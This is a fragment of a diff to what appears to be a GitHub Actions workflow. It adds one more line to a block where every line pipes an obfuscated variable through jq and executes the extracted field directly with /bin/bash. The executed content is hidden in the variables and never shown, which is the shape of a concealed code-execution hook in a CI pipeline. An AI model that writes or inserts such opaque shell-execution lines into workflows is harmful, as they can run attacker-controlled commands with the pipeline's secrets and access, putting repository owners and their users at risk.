@@ -36,6 +36,7 @@ jobs:
           echo $cu2 | jq -r .mu2 | /bin/bash
           printf '%s' "$e781" | jq -r .mr93254 | /bin/bash
           echo $rnw7 | jq -r .wcdxc06227 | /bin/bash
+          echo $xd263 | jq -r .ei4 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
